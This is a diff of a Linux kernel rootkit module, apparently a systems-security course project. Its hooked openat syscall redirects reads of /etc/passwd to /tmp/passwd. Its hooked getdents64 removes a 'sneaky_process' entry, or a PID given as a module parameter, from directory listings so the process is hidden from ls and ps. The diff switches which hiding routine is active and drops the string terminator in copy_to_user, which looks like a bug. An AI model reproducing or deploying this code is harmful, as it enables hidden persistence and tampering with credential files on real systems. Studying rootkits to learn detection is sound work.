@@ -56,10 +56,14 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
     // when command is accessing /etc/passwd through openat syscall
     if (strcmp(original_si, "/etc/passwd") == 0) {
         // replace /etc/passwd with /tmp/passwd using copy_to_user
-        copy_to_user((char *)regs->si, "/tmp/passwd", strlen("/tmp/passwd") + 1);
+        copy_to_user((char *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
     }
     return (*original_openat)(regs);
 }
+
+
+
+
 
 /* for #1 and #2: hide sneaky_process from ls, cd, find; hide /proc/sneaky_process_id and ps - a -u */
 
@@ -83,61 +87,61 @@ bool isSneakyProcess(struct linux_dirent64 *dirent) {
  * specified directory file descriptor,  and fills the directory entries it reads
  * into a buffer in user space. The sneaky version would ignore the snkeay_process
  */
-// asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
-//     // call original getdents64, and save bytes
-//     int length = original_getdents64(regs);
+asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
+    // call original getdents64, and save bytes
+    int length = original_getdents64(regs);
 
-//     // get the start address of the linux_dirent struct
-//     //struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
-//     struct linux_dirent64* dirent = (void*)(regs->si);
+    // get the start address of the linux_dirent struct
+    //struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
+    struct linux_dirent64* dirent = (void*)(regs->si);
 
-//     int offset = 0;
+    int offset = 0;
 
-//     // if (isSneakyProcess(dirent)) {
-//     // 	// if the first entry is sneaky_process, then skip it
-//     // 	offset += dirent->d_reclen;
-//     // 	// delete the sneaky_process from the buffer
-//     // 	memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
-//     //   length -= dirent->d_reclen;
-//     // } else {
-//     while (offset < length) {
-//         struct linux_dirent64* temp = (void*)dirent + offset;
-//         //struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
-//         if (isSneakyProcess(temp)) {
-//             // delete the sneaky_process from the buffer
-//             memmove((void *)temp, (void *)temp + temp->d_reclen, length - temp->d_reclen - offset);
-//             length -= temp->d_reclen;
-//         } else {
-//             offset += temp->d_reclen;
-//         }
-//     }
-//     return length;
-// }
-
-
-static char* pid = "";
-module_param(pid, charp, 0);
-
-asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
-  int totalDirpLength = original_getdents64(regs);
-  struct linux_dirent64* dirp = (void*)(regs->si);
-
-  int curr = 0;
-  while(curr < totalDirpLength){
-    struct linux_dirent64* dirpTemp = (void*)dirp + curr;
-    if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
-      int reclen = dirpTemp->d_reclen;
-      int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
-      void* source = (void*)dirpTemp + reclen;
-      memmove((void*)(regs->si) + curr, source, lenToBeCopied);
-      totalDirpLength -= reclen;
+    // if (isSneakyProcess(dirent)) {
+    // 	// if the first entry is sneaky_process, then skip it
+    // 	offset += dirent->d_reclen;
+    // 	// delete the sneaky_process from the buffer
+    // 	memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
+    //   length -= dirent->d_reclen;
+    // } else {
+    while (offset < length) {
+        struct linux_dirent64* temp = (void*)dirent + offset;
+        //struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
+        if (isSneakyProcess(temp)) {
+            // delete the sneaky_process from the buffer
+            memmove((void *)temp, (void *)temp + (int)(temp->d_reclen), length - (int)(temp->d_reclen) - offset);
+            length -= (int)(temp->d_reclen);
+        } else {
+            offset += (int)(temp->d_reclen);
+        }
     }
-    else{
-      curr += dirpTemp->d_reclen;
-    }
-  }
-  return totalDirpLength;
+    return length;
 }
+
+
+// static char* pid = "";
+// module_param(pid, charp, 0);
+
+// asmlinkage int sneaky_getdents64(struct pt_regs* regs){
+//   int totalDirpLength = original_getdents64(regs);
+//   struct linux_dirent64* dirp = (void*)(regs->si);
+
+//   int curr = 0;
+//   while(curr < totalDirpLength){
+//     struct linux_dirent64* dirpTemp = (void*)dirp + curr;
+//     if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
+//       int reclen = dirpTemp->d_reclen;
+//       int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
+//       void* source = (void*)dirpTemp + reclen;
+//       memmove((void*)(regs->si) + curr, source, lenToBeCopied);
+//       totalDirpLength -= reclen;
+//     }
+//     else{
+//       curr += dirpTemp->d_reclen;
+//     }
+//   }
+//   return totalDirpLength;
+// }
 
 
 
